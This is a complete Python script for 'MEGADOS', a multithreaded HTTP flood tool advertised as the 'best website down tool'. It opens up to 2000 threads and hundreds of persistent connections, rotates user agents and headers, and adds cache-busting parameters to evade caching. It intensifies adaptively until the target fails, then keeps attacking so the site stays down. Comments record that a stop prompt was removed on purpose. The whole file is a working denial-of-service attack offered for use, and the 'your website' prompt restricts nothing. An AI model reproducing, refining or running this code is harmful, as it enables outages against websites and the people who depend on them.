import threading
import requests
import random
import time
import socket
import sys
import os
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import http.client
import ssl

# ANSI escape codes for colors
class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    ORANGE = "\033[38;5;208m" # A custom orange color

# Banner
def print_banner():
    # Frames for animation
    frames = [
        f"""{Colors.RED}
  __  __ _____ ____      _          ____ ___  ____
 |  \/  | ____/ ___|    / \\        |  _ \\ / _ \\/ ___|
 | |\/| |  _|| |  _  / _ \\  _____ | | | | | | \\___ \\
 | |  | | |__| |_| |/ ___ \\ |_____| | |_| | |_| |___) |
 |_|  |_|_____\____/_/   \\_\\      |____/ \\___/|____/
{Colors.RESET}
    {Colors.BLUE}╔═════════════════════════════════════════════════╗
    ║                 {Colors.WHITE}MEGADOS - ONLINE{Colors.BLUE}                  ║
    ║                                                   ║
    ║           {Colors.YELLOW}BEST WEBSITE DOWN TOOL{Colors.BLUE}            ║
    ║                                                   ║
    ║          {Colors.ORANGE}ENJOY IT FOR FREE🔥🔥🔥{Colors.BLUE}            ║
    ║                                                   ║
    ╚═════════════════════════════════════════════════╝
        """,
        f"""{Colors.RED}
  __  __ _____ ____      _          ____ ___  ____
 |  \\/  | ____/ ___|    / \\        |  _ \\ / _ \\/ ___|
 | |\\/| |  _|| |  _  / _ \\  _____ | | | | | | \\___ \\
 | |  | | |__| |_| |/ ___ \\ |_____| | |_| | |_| |___) |
 |_|  |_|_____\____/_/   \\_\\      |____/ \\___/|____/
{Colors.RESET}
    {Colors.BLUE}╔═════════════════════════════════════════════════╗
    ║               {Colors.WHITE}MEGADOS - STANDBY{Colors.BLUE}                 ║
    ║                                                   ║
    ║           {Colors.YELLOW}BEST WEBSITE DOWN TOOL{Colors.BLUE}            ║
    ║                                                   ║
    ║          {Colors.ORANGE}ENJOY IT FOR FREE🔥🔥🔥{Colors.BLUE}            ║
    ║                                                   ║
    ╚═════════════════════════════════════════════════╝
        """,
        f"""{Colors.RED}
  __  __ _____ ____      _          ____ ___  ____
 |  \\/  | ____/ ___|    / \\        |  _ \\ / _ \\/ ___|
 | |\\/| |  _|| |  _  / _ \\  _____ | | | | | | \\___ \\
 | |  | | |__| |_| |/ ___ \\ |_____| | |_| | |_| |___) |
 |_|  |_|_____\____/_/   \\_\\      |____/ \\___/|____/
{Colors.RESET}
    {Colors.BLUE}╔═════════════════════════════════════════════════╗
    ║               {Colors.WHITE}MEGADOS - ACTIVE{Colors.BLUE}                  ║
    ║                                                   ║
    ║           {Colors.YELLOW}BEST WEBSITE DOWN TOOL{Colors.BLUE}            ║
    ║                                                   ║
    ║          {Colors.ORANGE}ENJOY IT FOR FREE🔥🔥🔥{Colors.BLUE}            ║
    ║                                                   ║
    ╚═════════════════════════════════════════════════╝
        """
    ]

    for i in range(5):  # Animate for 5 cycles
        for frame in frames:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(frame)
            time.sleep(0.3)  # Adjust speed of animation

    os.system('cls' if os.name == 'nt' else 'clear') # Clear screen after animation
    print(frames[0]) # Print the first frame as the final static banner

# Rest of your code remains the same...

# Constants and configurations
MAX_THREADS = 2000  # Maximum number of threads
SOCKET_CONNECTIONS = 500  # Maximum number of socket connections
INITIAL_THREADS = 50  # For testing phase
SUCCESS_MESSAGE = f"""{Colors.GREEN}
    ╔═════════════════════════════════════════════════╗
    ║                                                   ║
    ║            {Colors.WHITE}TARGET WEBSITE IS DOWN{Colors.GREEN}           ║
    ║                                                   ║
    ║            {Colors.WHITE}ATTACK WAS SUCCESSFUL{Colors.GREEN}            ║
    ║                                                   ║
    ╚═════════════════════════════════════════════════╝
    {Colors.RESET}"""

# Global variables
request_count = 0
success_count = 0
failed_count = 0
running = True
attack_active = False
target_down = False
target_down_time = None
last_check_time = 0
check_interval = 5  # seconds between availability checks
availability_history = []  # Track website availability
attack_paused = False

# Advanced User-Agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 OPR/78.0.4093.184",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Vivaldi/4.1",
]

# Enhanced Headers Pool
headers_pool = [
    {
        "User-Agent": "",  # Will be filled randomly
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache"
    },
    {
        "User-Agent": "",  # Will be filled randomly
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache"
    },
    {
        "User-Agent": "",  # Will be filled randomly
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "",  # Will be filled with target URL
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "TE": "trailers"
    }
]

# Request methods
request_methods = ["GET", "HEAD", "POST"]

# Payloads for POST requests
post_payloads = [
    {"data": "search=test&submit=Search"},
    {"data": "username=test&password=test&login=Login"},
    {"data": "comment=test&submit=Submit"},
    {"json": {"query": "test", "limit": 10}},
    {"json": {"action": "search", "params": {"q": "test", "page": 1}}},
]

# Socket dictionary to maintain persistent connections
sockets = {}

class AttackCoordinator:
    def __init__(self, url):
        self.url = url
        self.parsed_url = urlparse(url)
        self.hostname = self.parsed_url.netloc
        self.port = 443 if self.parsed_url.scheme == 'https' else 80
        self.use_ssl = self.parsed_url.scheme == 'https'
        self.path = self.parsed_url.path if self.parsed_url.path else "/"
        if self.parsed_url.query:
            self.path += f"?{self.parsed_url.query}"
            
        # Attack parameters
        self.current_threads = INITIAL_THREADS
        self.request_delay = 0.05  # Initial delay
        self.socket_count = 100  # Initial socket connections
        self.attack_intensity = 1  # Starting intensity level
        
        # Thread management
        self.active_threads = []
        self.thread_pool = None
        self.executor = None
        
        # User prompt lock
        self.prompt_lock = threading.Lock()

    def verify_target(self):
        """Check if target is reachable and get initial response time"""
        print(f"Testing connection to {self.hostname}...")
        try:
            start_time = time.time()
            socket.gethostbyname(self.hostname)
            response = requests.head(self.url, timeout=5)
            response_time = time.time() - start_time
            
            print(f"Target is reachable. Status: {response.status_code}")
            print(f"Initial response time: {response_time:.3f} seconds")
            return True, response_time
        except Exception as e:
            print(f"Error: Cannot reach target. {str(e)}")
            return False, 0

    def is_website_available(self):
        """Check if website is still available"""
        global last_check_time, availability_history
        
        # Only check periodically to avoid overloading
        current_time = time.time()
        if current_time - last_check_time < check_interval:
            return True
            
        last_check_time = current_time
        
        try:
            # Use a completely clean session with different User-Agent
            session = requests.Session()
            headers = {
                "User-Agent": f"AvailabilityChecker/1.0 ({random.randint(1000, 9999)})",
                "Accept": "text/html",
                "Connection": "close"
            }
            
            response = session.get(
                self.url, 
                headers=headers, 
                timeout=10,
                allow_redirects=False
            )
            
            # Check if we got a valid response
            if response.status_code < 500:  # Website is up if status code is less than 500
                availability_history.append(True)
                return True
            else:
                availability_history.append(False)
        except (requests.RequestException, socket.error, ssl.SSLError, 
                ConnectionError, TimeoutError):
            # Any exception means the website is likely down
            availability_history.append(False)
        
        # Keep history limited to last 5 checks
        if len(availability_history) > 5:
            availability_history = availability_history[-5:]
            
        # Consider website down only if it failed multiple times
        return any(availability_history[-3:]) if len(availability_history) >= 3 else True

    def adaptive_attack(self):
        """Adjust attack parameters based on website response"""
        global request_count, success_count, failed_count, attack_paused 
        
        if attack_paused:
            return 
            
        # Calculate success rate
        if request_count > 0:
            success_rate = success_count / request_count
        else:
            success_rate = 1.0
            
        # Check if website is still available
        website_up = self.is_website_available()
        
        if not website_up:
            # Website is down, mark as successful attack
            self.handle_website_down()
            return
            
        # Website is still up, adjust attack parameters
        if success_rate > 0.9:  # Good success rate, intensify attack
            self.attack_intensity += 1
            self.current_threads = min(self.current_threads + 200, MAX_THREADS)
            self.socket_count = min(self.socket_count + 50, SOCKET_CONNECTIONS)
            self.request_delay = max(self.request_delay * 0.7, 0.001)  # Decrease delay (faster requests)
            
            print(f"\n{Colors.CYAN}[INTENSIFYING ATTACK]{Colors.RESET} Level {self.attack_intensity}")
            print(f"Increasing to {self.current_threads} threads")
            print(f"Adjusting request delay to {self.request_delay:.4f} seconds")
            
            # Launch additional attack threads
            self.spawn_additional_threads()
            
        elif success_rate < 0.5:  # Poor success rate, adjust strategy
            # First try to slow down a bit to avoid overwhelming our connection
            self.request_delay = min(self.request_delay * 1.5, 0.1)
            print(f"\n{Colors.YELLOW}[ADJUSTING ATTACK]{Colors.RESET} Success rate low ({success_rate:.2f})")
            print(f"Adjusting request delay to {self.request_delay:.4f} seconds")

    def handle_website_down(self):
        """Handle the case when website is detected as down"""
        global target_down, target_down_time, running, attack_paused 
        
        if not target_down:
            target_down = True
            target_down_time = time.time()
            
            # Clear screen and show success message
            os.system('cls' if os.name == 'nt' else 'clear')
            print(SUCCESS_MESSAGE)
            print(f"{Colors.GREEN}Website has been taken down after sending {request_count} requests{Colors.RESET}")
            print(f"{Colors.GREEN}Attack duration: {target_down_time - start_time:.2f} seconds{Colors.RESET}")
            print(f"{Colors.GREEN}Final success rate: {(success_count / request_count) * 100:.1f}%{Colors.RESET}")
            print(f"\n{Colors.GREEN}Target is unresponsive. Attack successful.{Colors.RESET}")
            
            # **MODIFICATION HERE: Remove the user prompt to stop or continue**
            print("\nContinuing attack to keep the website down...")
            attack_paused = False # Ensure attack is not paused

    def spawn_additional_threads(self):
        """Spawn additional attack threads"""
        global attack_paused
        
        if attack_paused:
            return
            
        current_count = len(self.active_threads)
        new_threads = self.current_threads - current_count
        
        if new_threads <= 0:
            return
            
        print(f"Spawning {new_threads} additional attack threads...")
        
        # Create and start new threads
        for i in range(new_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.active_threads.append(t)

    def create_persistent_connection(self, socket_id):
        """Create and return a persistent HTTP(S) connection"""
        try:
            if self.use_ssl:
                context = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(
                    self.hostname, 
                    self.port, 
                    timeout=10,
                    context=context
                )
            else:
                conn = http.client.HTTPConnection(
                    self.hostname, 
                    self.port, 
                    timeout=10
                )
            return conn
        except Exception:
            return None

    def send_http_request(self, socket_id):
        """Send HTTP request using persistent connection"""
        global request_count, success_count, failed_count, attack_paused
        
        if attack_paused:
            time.sleep(0.5)  # Sleep while paused
            return False
            
        if socket_id not in sockets or sockets[socket_id] is None:
            sockets[socket_id] = self.create_persistent_connection(socket_id)
            
        if sockets[socket_id] is None:
            failed_count += 1
            return False
            
        try:
            # Choose random method
            method = random.choice(request_methods)
            
            # Prepare headers
            headers = random.choice(headers_pool).copy()
            headers["User-Agent"] = random.choice(user_agents)
            
            if "Referer" in headers:
                headers["Referer"] = self.url
                
            # Add random parameter to avoid caching
            path = f"{self.path}?nocache={random.randint(1, 999999)}"
            
            # Send request
            if method in ["GET", "HEAD"]:
                sockets[socket_id].request(method, path, headers=headers)
            else:  # POST
                payload = random.choice(post_payloads)
                body = payload.get("data", "") if "data" in payload else ""
                
                if "json" in payload:
                    import json
                    body = json.dumps(payload["json"])
                    headers["Content-Type"] = "application/json"
                else:
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    
                headers["Content-Length"] = str(len(body))
                sockets[socket_id].request(method, path, body=body, headers=headers)
                
            # Get response
            response = sockets[socket_id].getresponse()
            response.read()  # Read and discard the response body
            
            request_count += 1
            if response.status < 400:
                success_count += 1
            else:
                failed_count += 1
                
            return True
        except Exception:
            # Connection failed, create a new one next time
            sockets[socket_id] = None
            failed_count += 1
            request_count += 1
            return False

    def standard_request(self):
        """Send a standard HTTP request using requests library"""
        global request_count, success_count, failed_count, attack_paused
        
        if attack_paused:
            time.sleep(0.5)  # Sleep while paused
            return False
            
        try:
            # Choose random method
            method = random.choice(request_methods)
            
            # Prepare headers
            headers = random.choice(headers_pool).copy()
            headers["User-Agent"] = random.choice(user_agents)
            
            if "Referer" in headers:
                headers["Referer"] = self.url
                
            # Add random parameter to avoid caching
            url = f"{self.url}?nocache={random.randint(1, 999999)}"
            
            # Send request
            if method in ["GET", "HEAD"]:
                response = requests.request(
                    method=method,
                    url=url,
                    headers=headers,
                    timeout=5
                )
            else:  # POST
                payload = random.choice(post_payloads)
                response = requests.post(
                    url=url,
                    headers=headers,
                    **payload,
                    timeout=5
                )
                
            request_count += 1
            if response.status_code < 400:
                success_count += 1
            else:
                failed_count += 1
                
            return True
        except Exception:
            request_count += 1
            failed_count += 1
            return False

    def worker(self):
        """Worker function for sending requests"""
        global running, attack_paused
        
        # Assign a unique socket ID for this thread
        socket_id = threading.get_ident()
        
        # Use a mix of persistent connections and standard requests
        while running: # Keep running as long as 'running' is True
            if attack_paused:
                time.sleep(0.5)  # Sleep while attack is paused
                continue
                
            if random.random() < 0.7:  # 70% persistent connections
                self.send_http_request(socket_id)
            else:  # 30% standard requests
                self.standard_request()
                
            time.sleep(self.request_delay)
            
    def run_testing_phase(self):
        """Run initial testing phase"""
        global request_count, start_time
        
        print("\nStarting initial testing phase (15 seconds)...")
        
        # Start a small number of threads for testing
        for i in range(INITIAL_THREADS):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
        # Monitor for 15 seconds
        test_start_time = time.time()
        last_count = 0
        
        while time.time() - test_start_time < 15 and running:
            time.sleep(1)
            current_count = request_count
            current_rps = current_count - last_count
            last_count = current_count
            
            elapsed = time.time() - test_start_time
            print(f"Testing: {elapsed:.1f}/15s | Current: {current_rps} req/s | Total: {current_count}")
            
        # Analyze results
        test_duration = time.time() - test_start_time
        if request_count > 0:
            rps = request_count / test_duration
            success_rate = (success_count / request_count) * 100
            
            print("\n===== TESTING PHASE COMPLETE =====")
            print(f"Website handled {rps:.2f} requests per second")
            print(f"Success rate: {success_rate:.1f}%")
            
            # Calculate optimal parameters based on test results
            if rps < 10:
                # Website is very responsive, go aggressive
                self.current_threads = 1000
                self.request_delay = 0.001
                self.socket_count = 400
            elif rps < 50:
                # Medium response, balanced attack
                self.current_threads = 750 
                self.request_delay = 0.005
                self.socket_count = 300
            else:
                # Fast website, more methodical approach
                self.current_threads = 500
                self.request_delay = 0.01
                self.socket_count = 200
                
            print("\n===== ATTACK CONFIGURATION =====")
            print(f"Threads: {self.current_threads}")
            print(f"Socket connections: {self.socket_count}")
            print(f"Request delay: {self.request_delay:.4f} seconds")
            
            return True
        else:
            print("Testing failed. No successful requests.")
            return False

    def launch_full_attack(self):
        """Launch the full attack with optimized parameters"""
        global running, attack_active
        
        print("\n===== LAUNCHING FULL ATTACK =====")
        print(f"Target: {self.url}")
        print(f"Launching with {self.current_threads} threads")
        print("Attack starting in 3 seconds...")
        time.sleep(3)
        
        # Reset counters
        global request_count, success_count, failed_count
        request_count = 0
        success_count = 0
        failed_count = 0
        
        # Mark attack as active
        attack_active = True
        
        # Launch attack threads
        self.active_threads = []
        for i in range(self.current_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
            # Show progress periodically
            if i % 100 == 0 and i > 0:
                print(f"Started {i} attack threads...")
                
        print(f"All {self.current_threads} attack threads launched.")
        
        # Start adaptive attack monitoring
        while running: # Changed from 'while running and not target_down'
            time.sleep(5)  # Check every 5 seconds
            self.adaptive_attack()

    def check_for_continuation_or_stop(self):
        """Periodically check if the website is still down and inform user"""
        global running, attack_paused, target_down
        
        check_interval = 30  # Check every 30 seconds after website is down
        
        while running:
            if target_down and not attack_paused:
                # Website is down and attack isn't paused by the user.
                # Just confirm it remains down without asking for input.
                if not self.is_website_available():
                    sys.stdout.write(f"\r{Colors.GREEN}[WEBSITE DOWN]{Colors.RESET} Confirmed: Target remains down. Continuing attack.  ")
                    sys.stdout.flush()
                else:
                    print(f"\n{Colors.YELLOW}Website appears to be back up. Resuming attack to take it down again...{Colors.RESET}")
                    target_down = False
                    attack_paused = False # Ensure attack resumes
            time.sleep(check_interval)

    def stats_monitor(self):
        """Monitor and display attack statistics"""
        global running, attack_active, request_count, attack_paused
        
        last_count = 0
        last_time = time.time()
        
        while running:
            time.sleep(1)
            
            if attack_paused:
                # Just display paused status
                sys.stdout.write(f"\r{Colors.YELLOW}[ATTACK PAUSED]{Colors.RESET} Waiting for user input...                                  ")
                sys.stdout.flush()
                continue
                
            current_time = time.time()
            elapsed = current_time - last_time
            current_count = request_count
            
            if elapsed > 0:
                current_rps = (current_count - last_count) / elapsed
                last_count = current_count
                last_time = current_time
                
                if attack_active: # Removed `and not target_down` here
                    # Calculate success rate
                    success_rate = (success_count / request_count) * 100 if request_count > 0 else 0
                    
                    sys.stdout.write(f"\rThreads: {len(self.active_threads)} | Rate: {current_rps:.1f} req/s | Total: {request_count} | Success: {success_rate:.1f}%")
                    sys.stdout.flush()

# Main execution
if __name__ == "__main__":
    try:
        print_banner()
        
        # Get target URL
        target_url = input("Enter YOUR website URL to test and attack: ")
        
        # Ensure URL has a scheme
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
            
        # Initialize attack coordinator
        coordinator = AttackCoordinator(target_url)
        
        # Verify target is reachable
        reachable, _ = coordinator.verify_target()
        if not reachable:
            print("Target is not reachable. Exiting.")
            sys.exit(1)
            
        # Record start time
        start_time = time.time()
        
        # Start stats monitor thread
        stats_thread = threading.Thread(target=coordinator.stats_monitor)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start continuation checker thread (modified to not ask for input)
        continuation_thread = threading.Thread(target=coordinator.check_for_continuation_or_stop)
        continuation_thread.daemon = True
        continuation_thread.start()
        
        # Run testing phase
        if coordinator.run_testing_phase():
            # Launch full attack
            coordinator.launch_full_attack()
        
        # Keep main thread alive
        while running:
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Test interrupted by user. Shutting down...{Colors.RESET}")
        running = False
        
        # Final stats if available
        if request_count > 0:
            print(f"\n{Colors.CYAN}===== FINAL RESULTS ====={Colors.RESET}")
            print(f"Total requests sent: {request_count}")
            print(f"Success rate: {(success_count / request_count) * 100:.1f}%")
            
            if target_down:
                print(f"\n{Colors.GREEN}TARGET WEBSITE SUCCESSFULLY TAKEN DOWN{Colors.RESET}")
            else:
                print(f"\n{Colors.RED}Attack stopped before target was taken down{Colors.RESET}")
                
    except Exception as e:
        print(f"\n{Colors.RED}An error occurred: {str(e)}{Colors.RESET}")
        
    finally:
        print(f"\n{Colors.MAGENTA}Test complete. Exiting.{Colors.RESET}")
        # Force exit to terminate all threads
        os._exit(0)
